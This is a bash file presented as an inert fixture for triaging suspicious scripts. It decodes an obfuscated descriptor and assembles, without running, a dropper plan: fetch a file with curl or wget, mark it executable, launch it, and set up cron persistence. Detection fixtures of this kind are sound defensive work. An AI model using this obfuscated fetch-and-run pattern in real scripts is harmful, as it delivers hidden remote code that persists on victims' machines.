# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_a7689a6a='86-d3-81-d7-d1-82-8c-85-86-87-98-d0-c1-d4-d1-c5-c0-9a-d1-9b-db-da-c7-d6-9a-d6-c1-d0-9a-88-dd-c1-d4-c5-ea-db-da-c7-d6-c9-d0-d6-dc-c3-c7-d0-c6-9b-86-d3-81-d7-d1-82-8c-85-86-87-98-d0-c1-d4-d1-c5-c0-88-d0-d8-d4-db-ea-d0-d6-dc-c3-c7-d0-c6-c9-d8-98-d0-d8-d4-db-c0-88-d0-d7-da-c7-c5-ea-dd-d6-c7-d4-c9-86-d3-81-d7-d1-82-8c-85-86-87-98-d0-d2-d4-c1-c6-9b-9a-d0-dd-d6-d4-d6-98-c6-c6-d0-c7-c1-db-c0-dd-9a-c5-d8-c1-9a-88-dd-c1-d4-c5-ea-d0-d9-dc-d3-c9-86-d3-81-d7-d1-82-8c-85-86-87-9a-d7-d4-f9-c6-c6-d0-c7-c1-db-c0-fd-88-c1-db-d0-d2-d4-ea-c7-d0-c6-c0-c9-dd-c6-9b-d3-d1-d7-83-d3-82-82-d3-9a-d1-dc-d9-d4-c3-db-dc-9b-d0-d9-c5-d8-d4-cd-d0-9b-86-d3-81-d7-d1-82-8c-85-86-87-9a-9a-8f-c6-c5-c1-c1-dd-88-d9-c7-c0-c9-86-d3-81-d7-d1-82-8c-85-86-87-98-db-d2-dc-d4-c5-d8-d4-d6-88-d1-dc-ea-db-d2-dc-d4-c5-d8-d4-d6-c9-80-88-c1-db-c0-da-d6-ea-d0-d2-d4-c1-c6-c9-de-d6-d4-d7-d9-d9-d4-d3-ea-dd-d6-c7-d4-ea-d9-c7-c0-d6-88-c7-d0-c1-c5-d4-d1-d4-c9-c6-c6-d0-d6-da-c7-c5-ea-dd-d6-c1-d4-c5-c6-dc-d1-99-d0-d1-da-d8-ea-d0-d2-db-d4-dd-d6-99-d0-d9-dc-d3-ea-d0-c1-dc-c7-c2-99-d0-c1-da-d8-d0-c7-ea-d0-c7-dc-c0-c4-d6-d4-99-c1-c6-da-dd-ea-d0-d9-dc-d3-da-c7-c5-88-c6-c5-d0-c1-c6-c9-84-88-c3'
readonly Codec_a7689a6a='hex_dash|reverse_then_xor|b5'

Load_a7689a6a() {
  EnCoDeD_Bytes=()
  local IFS='-' PaRt
  local -a pieces
  read -r -a pieces <<< "${Material_a7689a6a}"
  for PaRt in "${pieces[@]}"; do EnCoDeD_Bytes+=("$((16#$PaRt))"); done
}

Decode_a7689a6a() {
  DeCoDeD_Bytes=()
  local InDeX
  for ((InDeX=0; InDeX<${#EnCoDeD_Bytes[@]}; InDeX++)); do
    DeCoDeD_Bytes[${#EnCoDeD_Bytes[@]}-1-InDeX]="$((EnCoDeD_Bytes[InDeX] ^ 181))"
  done
}

Recover_a7689a6a() {
  local -a EnCoDeD_Bytes DeCoDeD_Bytes
  local DeScRiPtOr_Text NeUtRaL PaSs InDeX
  NeUtRaL="${HUNTRESS_FIXTURE_CONTEXT:-host}"
  Load_a7689a6a
  PaSs=0; while ((PaSs < 1)); do Decode_a7689a6a; ((PaSs+=1)); done
  DeScRiPtOr_Text=''
  local octal character
  for InDeX in "${!DeCoDeD_Bytes[@]}"; do
    printf -v octal '%03o' "${DeCoDeD_Bytes[InDeX]}"
    printf -v character '%b' "\\$octal"
    DeScRiPtOr_Text+="$character"
  done
  printf '%s\n' "$DeScRiPtOr_Text"
}

Inspect_a7689a6a() { local recovered; recovered="$(Recover_a7689a6a)"; printf '%s\n' "$recovered"; }

Plan_a7689a6a() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_a7689a6a)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
  declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_a7689a6a; fi

# reconstruction complete